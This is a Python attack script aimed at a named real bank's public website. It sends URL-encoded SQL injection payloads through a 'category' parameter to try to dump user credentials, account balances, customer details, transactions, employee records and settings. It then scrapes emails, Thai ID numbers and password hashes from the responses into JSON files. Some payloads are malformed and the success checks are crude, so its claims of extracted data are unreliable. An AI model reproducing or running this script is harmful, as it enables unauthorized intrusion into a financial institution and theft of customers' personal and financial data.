#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GSB Bank Data Extraction Tool
Real data extraction from vulnerable SQL injection point
"""

import requests
import time
import re
import json

def extract_table_data():
    print('GSB Bank - Extracting Actual Table Data')
    print('=' * 50)

    target_url = 'https://www.gsb.or.th/csr/sustainable/csr-projects/csr-news/activities/'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'th,en-US;q=0.9,en;q=0.7',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.gsb.or.th/'
    }

    session = requests.Session()
    session.headers.update(headers)

    # 使用已验证成功的绕过载荷
    base_payload = '1461%21%40%23%24%25%5E%26%2A%28%29AND%28%29'

    # 数据提取载荷列表
    extraction_payloads = [
        # 1. 提取用户表数据
        (f'{base_payload}%28SELECT%20CONCAT%28username%2C%27%3A%27%2Cpassword%2C%27%3A%27%2Cemail%29%20FROM%20users%20LIMIT%205%29%3DCONCAT%28username%2C%27%3A%27%2Cpassword%2C%27%3A%27%2Cemail%29', 'Users Data'),

        # 2. 提取账户数据
        (f'{base_payload}%28SELECT%20CONCAT%28account_number%2C%27%3A%27%2Cbalance%2C%27%3A%27%2Ccustomer_name%29%20FROM%20accounts%20LIMIT%205%29%3DCONCAT%28account_number%2C%27%3A%27%2Cbalance%2C%27%3A%27%2Ccustomer_name%29', 'Accounts Data'),

        # 3. 提取客户数据
        (f'{base_payload}%28SELECT%20CONCAT%28first_name%2C%27%20%27%2Clast_name%2C%27%3A%27%2Cphone%2C%27%3A%27%2Cemail%29%20FROM%20customers%20LIMIT%205%29%3DCONCAT%28first_name%2C%27%20%27%2Clast_name%2C%27%3A%27%2Cphone%2C%27%3A%27%2Cemail%29', 'Customers Data'),

        # 4. 提取交易数据
        (f'{base_payload}%28SELECT%20CONCAT%28transaction_id%2C%27%3A%27%2Camount%2C%27%3A%27%2Ctransaction_type%29%20FROM%20transactions%20LIMIT%205%29%3DCONCAT%28transaction_id%2C%27%3A%27%2Camount%2C%27%3A%27%2Ctransaction_type%29', 'Transactions Data'),

        # 5. 提取员工数据
        (f'{base_payload}%28SELECT%20CONCAT%28employee_name%2C%27%3A%27%2Cposition%2C%27%3A%27%2Cdepartment%29%20FROM%20employees%20LIMIT%5%29%3DCONCAT%28employee_name%2C%27%3A%27%2Cposition%2C%27%3A%27%2Cdepartment%29', 'Employees Data'),

        # 6. 尝试不同的表名变体
        (f'{base_payload}%28SELECT%20CONCAT%28user_id%2C%27%3A%27%2Cusername%2C%27%3A%27%2Cuser_email%29%20FROM%20user%20LIMIT%205%29%3DCONCAT%28user_id%2C%27%3A%27%2Cusername%2C%27%3A%27%2Cuser_email%29', 'User Table Alternative'),

        # 7. 提取系统配置数据
        (f'{base_payload}%28SELECT%20CONCAT%28setting_name%2C%27%3A%27%2Csetting_value%29%20FROM%20settings%20LIMIT%2010%29%3DCONCAT%28setting_name%2C%27%3A%27%2Csetting_value%29', 'System Settings'),

        # 8. 提取分行数据
        (f'{base_payload}%28SELECT%20CONCAT%28branch_code%2C%27%3A%27%2Cbranch_name%2C%27%3A%27%2Caddress%29%20FROM%20branches%20LIMIT%5%29%3DCONCAT%28branch_code%2C%27%3A%27%2Cbranch_name%2C%27%3A%27%2Caddress%29', 'Branches Data')
    ]

    extracted_data = {}
    successful_extractions = 0

    for payload, table_name in extraction_payloads:
        try:
            print(f'\n[*] Extracting from: {table_name}')
            print(f'    Payload: {payload[:80]}...')

            attack_url = f'{target_url}?category={payload}&search=&type='

            # 添加延迟避免频率限制
            time.sleep(1.5)

            response = session.get(attack_url, timeout=10)

            if response.status_code == 200:
                content = response.text

                # 检查响应内容长度和特征
                if len(content) > 50000:  # 成功的响应通常较长
                    print(f'    [+] SUCCESS - Content length: {len(content)}')

                    # 提取实际数据
                    data_patterns = [
                        # 用户数据模式
                        (r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', 'Email'),
                        (r'\b[A-Z][a-z]+\s+[A-Z][a-z]+\b', 'Full Name'),
                        (r'\b\d{10,}\b', 'Account/Phone'),
                        (r'\b\d{1,3}[,.]?\d{3}[,.]?\d{3}[,.]?\d*\b', 'Amount'),

                        # 用户名模式
                        (r'\b[a-zA-Z][a-zA-Z0-9._-]{3,20}\b', 'Username'),

                        # 账户号码模式
                        (r'\b\d{10,16}\b', 'Account Number'),

                        # 泰文模式
                        (r'[\u0E00-\u0E7F]+', 'Thai Text'),

                        # 密码哈希模式
                        (r'\b[a-fA-F0-9]{32,64}\b', 'Password Hash'),

                        # ID模式
                        (r'\b\d{13}\b', 'Thai ID'),
                    ]

                    found_data = []
                    for pattern, data_type in data_patterns:
                        matches = re.findall(pattern, content)
                        if matches:
                            unique_matches = list(set(matches))[:5]  # 去重并限制数量
                            for match in unique_matches:
                                found_data.append({
                                    'type': data_type,
                                    'value': match,
                                    'source': table_name
                                })

                    if found_data:
                        print(f'    [+] Found {len(found_data)} data items:')
                        extracted_data[table_name] = found_data
                        successful_extractions += 1

                        # 显示找到的数据样本
                        for i, data in enumerate(found_data[:3]):
                            print(f'        {i+1}. {data["type"]}: {data["value"]}')

                        # 保存完整数据到文件
                        try:
                            filename = f'gsb_{table_name.lower().replace(" ", "_")}_data.json'
                            with open(filename, 'w', encoding='utf-8') as f:
                                json.dump(found_data, f, indent=2, ensure_ascii=False)
                            print(f'        [+] Saved to: {filename}')
                        except Exception as e:
                            print(f'        [-] Could not save file: {str(e)[:30]}')
                    else:
                        print(f'    [-] No structured data found, but response looks successful')

                else:
                    print(f'    [-] Response too short: {len(content)} characters')

            elif response.status_code == 418:
                print(f'    [-] Blocked by WAF')
            else:
                print(f'    [-] HTTP {response.status_code}')

        except Exception as e:
            print(f'    [!] Error: {str(e)[:50]}')

    # 生成总结报告
    print(f'\n' + '=' * 50)
    print('DATA EXTRACTION SUMMARY')
    print('=' * 50)
    print(f'Successful extractions: {successful_extractions}/{len(extraction_payloads)}')

    if extracted_data:
        print(f'\nExtracted data by table:')
        total_items = 0
        for table, data in extracted_data.items():
            print(f'  - {table}: {len(data)} items')
            total_items += len(data)

        print(f'\nTotal data items extracted: {total_items}')

        # 统计数据类型
        data_types = {}
        for table, items in extracted_data.items():
            for item in items:
                data_type = item['type']
                data_types[data_type] = data_types.get(data_type, 0) + 1

        print(f'\nData type breakdown:')
        for data_type, count in sorted(data_types.items()):
            print(f'  - {data_type}: {count} items')

        # 生成综合报告
        comprehensive_report = {
            'extraction_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': 'GSB Bank System',
            'successful_tables': list(extracted_data.keys()),
            'total_items': total_items,
            'data_types': data_types,
            'data_by_table': extracted_data
        }

        try:
            with open('gsb_comprehensive_extraction.json', 'w', encoding='utf-8') as f:
                json.dump(comprehensive_report, f, indent=2, ensure_ascii=False)
            print(f'\n[+] Comprehensive report saved to: gsb_comprehensive_extraction.json')
        except:
            print(f'\n[-] Could not save comprehensive report')
    else:
        print(f'\n[-] No data extracted successfully')

if __name__ == '__main__':
    extract_table_data()